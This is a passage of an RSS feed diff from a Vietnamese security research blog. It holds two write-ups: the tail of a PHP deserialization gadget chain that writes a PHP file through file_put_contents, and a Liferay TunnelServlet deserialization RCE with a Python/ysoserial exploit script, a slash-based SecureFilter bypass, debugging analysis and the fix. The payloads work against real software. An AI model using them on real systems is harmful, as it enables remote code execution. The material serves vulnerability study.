style="color:#a6e22e">Ba</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bi</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A0</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A25</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">Psy</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CReadline</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CHoa</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CFileRead</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A10</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#a6e22e">_bucket</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">Ba</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A2</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bi</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A0</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">Termwind</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CComponents</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CHr</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A2</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A9</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#a6e22e">styles</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">BO</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A28</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">Termwind</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CValueObjects</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CStyles</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A2</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A43</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#a6e22e">Termwind</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CValueObjects</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CStyles</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#a6e22e">textModifiers</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">Ba</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A1</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bi</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A0</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A17</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">file_put_contents</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">B</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Ds</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A40</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#a6e22e">Termwind</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CValueObjects</span><span style="color:#f92672">%</span><span style="color:#ae81ff">5</span><span style="color:#a6e22e">CStyles</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#a6e22e">properties</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">Ba</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A2</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A6</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">styles</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A19</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">C</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">Fphp</span><span style="color:#f92672">+</span><span style="color:#a6e22e">phpinfo</span><span style="color:#f92672">%</span><span style="color:#ae81ff">28</span><span style="color:#f92672">%</span><span style="color:#ae81ff">29</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">B</span><span style="color:#f92672">+%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">F</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">E</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A12</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">parentStyles</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">Bi</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A0</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">B</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Ds</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A10</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#f92672">%</span><span style="color:#ae81ff">2</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">00</span><span style="color:#a6e22e">content</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">Bs</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A7</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#a6e22e">abc</span><span style="color:#f92672">.</span><span style="color:#a6e22e">php</span><span style="color:#f92672">%</span><span style="color:#ae81ff">22</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">B</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">Di</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A2</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">Br</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">A5</span><span style="color:#f92672">%</span><span style="color:#ae81ff">3</span><span style="color:#a6e22e">B</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">D</span><span style="color:#f92672">%</span><span style="color:#ae81ff">7</span><span style="color:#a6e22e">D</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">decode</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">O</span><span style="color:#f92672">:</span><span style="color:#ae81ff">28</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;Monolog\Handler\GroupHandler&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">11</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;*handlers&#34;</span>;<span style="color:#a6e22e">a</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">i</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>;<span style="color:#a6e22e">O</span><span style="color:#f92672">:</span><span style="color:#ae81ff">25</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;Psy</span><span style="color:#ae81ff">\R</span><span style="color:#e6db74">eadline\Hoa\FileRead&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">10</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;*_bucket&#34;</span>;<span style="color:#a6e22e">a</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">i</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>;<span style="color:#a6e22e">O</span><span style="color:#f92672">:</span><span style="color:#ae81ff">22</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;Termwind\Components\Hr&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">9</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;*styles&#34;</span>;<span style="color:#a6e22e">O</span><span style="color:#f92672">:</span><span style="color:#ae81ff">28</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;Termwind\ValueObjects\Styles&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">43</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;Termwind\ValueObjects\StylestextModifiers&#34;</span>;<span style="color:#a6e22e">a</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">i</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">17</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;file_put_contents&#34;</span>;}<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">40</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;Termwind\ValueObjects\Stylesproperties&#34;</span>;<span style="color:#a6e22e">a</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">6</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;styles&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">19</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">12</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;parentStyles&#34;</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">:</span><span style="color:#ae81ff">0</span>;}}<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">10</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;*content&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">7</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;abc.php&#34;</span>;}<span style="color:#a6e22e">i</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span>;<span style="color:#a6e22e">r</span><span style="color:#f92672">:</span><span style="color:#ae81ff">5</span>;}}}}
+</span></span></code></pre></div><p>Send payload:</p>
+<p></p>
+<p></p>
+</li>
+<li>
+<p><strong>Recommendation</strong></p>
+<p>Phiên bản mới nhất là v11.19.0 vẫn còn tồn tại gadget chain này.</p>
+</li>
+</ol>
+]]></description>
+</item>
+<item>
+    <title>Liferay TunnelServlet Deserialization Remote Code Execution (LPE-15538)</title>
+    <link>https://g03m0n.github.io/posts/liferay-tunnelservlet-deserialization-remote-code/liferay-tunnelservlet-deserialization-remote-code/</link>
+    <pubDate>Wed, 22 Nov 2023 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/liferay-tunnelservlet-deserialization-remote-code/liferay-tunnelservlet-deserialization-remote-code/</guid>
+    <description><![CDATA[<h1 id="liferay-tunnelservlet-deserialization-remote-code-execution-lpe-15538">Liferay TunnelServlet Deserialization Remote Code Execution (LPE-15538)</h1>
+<p>{{ .Resources.Match &ldquo;images/*&rdquo;}}</p>
+<ol>
+<li>
+<p>Mô tả và ảnh hưởng</p>
+<p>Liferay TunnelServlet bị lỗ hổng insecure deserialization do cấu hình sai, có thể bị truy cập bởi attacker (theo mặc định, nó chỉ bị giới hạn truy cập từ localhost). Tùy thuộc vào phiên bản của Liferay Portal, attacker có thể khai thác lỗ hổng này bằng cách sử dụng dữ liệu đã được serialized để thực thi mã tùy ý trên hệ thống.</p>
+<p>Các phiên bản ảnh hưởng:</p>
+<ul>
+<li>Liferay Portal CE 7.0 GA3, 7.0.1 GA2, 7.0.2 GA3</li>
+<li>Liferay Portal EE 6.0, 6.0 SP1, 6.0 SP2, 6.1 GA1, 6.1 GA2, 6.1 GA3, 6.2</li>
+<li>Liferay Digital Enterprise 7.0</li>
+</ul>
+</li>
+<li>
+<p>Chuẩn bị môi trường</p>
+<p>Cài đặt phiên bản ảnh hưởng: <a href="https://sourceforge.net/projects/lportal/files/Liferay%20Portal/6.1.0%20GA1/liferay-portal-tomcat-6.1.0-ce-ga1-20120106155615760.zip/download" target="_blank" rel="noopener noreffer"><strong>https://sourceforge.net/projects/lportal/files/Liferay%20Portal/6.1.0%20GA1/liferay-portal-tomcat-6.1.0-ce-ga1-20120106155615760.zip/download</strong></a>
+</p>
+<p>Giải nén và chạy file <code>..\liferay-portal-6.1.0-ce-ga1\tomcat-7.0.23\bin\startup.bat</code> để khởi chạy server.</p>
+<p></p>
+</li>
+<li>
+<p>Demo khai thác</p>
+<p>Payload:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#66d9ef">import</span> <span style="color:#a6e22e">requests</span>, <span style="color:#a6e22e">os</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://192.168.1.84:8080&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">os</span>.<span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;java \
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">--add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">--add-opens=java.base/sun.reflect.annotation=ALL-UNNAMED\
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">-jar ./ysoserial-all.jar CommonsCollections3 calc.exe &gt; payload.bin &#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">r</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">requests</span>.<span style="color:#a6e22e">post</span>(<span style="color:#a6e22e">url</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/api/////liferay&#34;</span>, <span style="color:#a6e22e">data</span><span style="color:#f92672">=</span> <span style="color:#a6e22e">open</span>(<span style="color:#e6db74">&#34;payload.bin&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>))
+</span></span></code></pre></div><p></p>
+</li>
+<li>
+<p>Phân tích lỗ hổng</p>
+</li>
+</ol>
+<p>Tại file <code>..\tomcat-7.0.23\webapps\ROOT\WEB-INF\web.xml</code>, ta biết được các request đến <code>/api/liferay/*</code> sẽ được class Tunnel Servlet xử lí.</p>
+<p></p>
+<p></p>
+<p>Đi vào class Tunnel Servlet.</p>
+<p>Tại đây, phương thức <code>doPost</code> dùng để xử lý POST request, TunnelServlet nhận <code>ObjectInputStream</code> từ Post data (dòng 40) và sử dụng hàm <code>readObject()</code> (dòng 52) không đúng cách → Insecure deserialization.</p>
+<p></p>
+<p>Tuy nhiên, các đường dẫn <code>/api/liferay/*</code> mặc định chỉ được truy cập bởi localhost, mọi request từ bên ngoài đều bị filter. Cụ thể, khi truy cập <code>/api/liferay/*</code> thì Tunnel Servlet Filter được sử dụng.</p>
+<p></p>
+<p>Nó được định nghĩa tại class <code>com.liferay.portal.servlet.filters.secure.SecureFilter</code></p>
+<p></p>
+<p>Tại class <code>SecureFilter</code>, hàm <code>processFilter</code> được gọi để thực hiện các quy trình filter. Trong đó có chức năng kiểm tra xem Remote Address có nằm trong whitelist các Allowed host được access hay không bằng hàm <code>isAccessAllowed()</code>. Nếu không thì sẽ bị trả 403 Access denied. Đặt breakpoint như hình và debug.</p>
+<p></p>
+<p>Đặt Breakepoint tại dòng 86 và gửi gón tin POST tới</p>
+<p></p>
+<p>Hit breakpoint</p>
+<p></p>
+<p>F7 để đi vào hàm <code>isAccessAllowed()</code>.</p>
+<p></p>
+<p>Tại đây, ứng dụng sẽ kiểm tra xem <code>remoteAddr</code> (192.168.1.84) có nằm trong mảng whitelist ({SERVER_IP, 127.0.0.1}) <code>hostAllowed</code> hay không → nó không thuộc whitelist → Access denied.</p>
+<p>Tuy nhiên, để bypass filter này ta chỉ cần thêm n dấu <code>/</code> vào path <code>/api/liferay</code> → <code>/api/////liferay</code></p>
+<p></p>
+<p>Khi truy cập endpoint <code>/api/liferay</code>, đầu tiên request sẽ được filter thông qua hàm <code>doFilter()</code> của InvokerFilter class. Sau đó các <code>InvokerFilterChain</code> về urlPattern: <code>/api/liferay/*</code> được lấy để thực hiện filter request. Có thể thấy với /api/liferay thì có đi qua <code>SecureFilter</code>.</p>
+<p></p>
+<p>Còn <code>/api////////liferay</code> thì không:</p>
+<p></p>
+<p>Nguyên nhân nằm ở nơi lấy <code>InvokerFilterChain</code></p>
+<p></p>
+<p>Tại đây phương thức <code>getInvokerFilter()</code>  được gọi để thiết lập filterChain cho url, với các tham số truyền vào là <code>request</code> hiện tại, <code>uri</code> (/api/////liferay) và <code>filterchain</code></p>
+<p>Đi vào phương thức <code>getInvokerFilterChain()</code></p>
+<p></p>
+<p>Phương thức sẽ lấy <code>filterChain</code> từ 1 list có trước (<code>_filterChains</code>), với key chính là hashcode của uri truyền vào.
+Trong trường hợp truyền vào <code>/api////////liferay</code> thì sẽ tạo ra 1 hashcode khác, không tồn tại trong <code>_filterChains</code>, khi đó <code>invokerFilterChain == null</code> và sẽ nhảy tiếp vào phương thức
+<code>_invokerFilterHelper.createInvokerFilterChain()</code> để tạo ra 1 object <code>filterChain</code> mới.</p>
+<p>Đi vào phương thức <code>createInvokerFilterChain()</code></p>
+<p></p>
+<p>Phương thức sẽ check match của uri truyền vào với các filterMap đã có sẵn.</p>
+<p>Chức năng của phương thức <code>isMatch()</code>là check xem uri truyền vào có giống với pattern của rule không, nếu có thì sẽ trả về true và add filter này vào list.</p>
+<p></p>
+<p>Bởi vì giá trị trả về của <code>isMatchURLPattern</code> là false nên filter này sẽ không được add vào <code>invokerFilterChain</code></p>
+<p></p>
+<p>Có thể nhìn thấy được <code>uri</code> truyền vào và <code>urlpattern</code> không match do <code>matchURLPattern</code> trả về false</p>
+<p></p>
+<p>→ <code>SecureFilter</code> không được add vào với request là <code>/api/////////liferay</code></p>
+<p>→ <code>SecureFilter</code> không được invoke nên bị bypass</p>
+<ol>
+<li>Sửa lỗi của NPH.</li>
+</ol>
+<p>Liferay đã thêm một hàm <code>ProtectedClassLoaderObjectInputStream()</code> để filter những authenticated access, và userInputStream.</p>
+<p></p>
+<p>Tại các phiên bản sau, sau khi lấy URI bằng hàm <code>getURI()</code> tại class InvokerFilter Liferay đã thực hiện normalize lại nó bằng hàm <code>HttpComponentsUtil.normalizePath()</code></p>
+<p></p>
+<p></p>
+]]></description>
+</item>
+</channel>
+</rss>
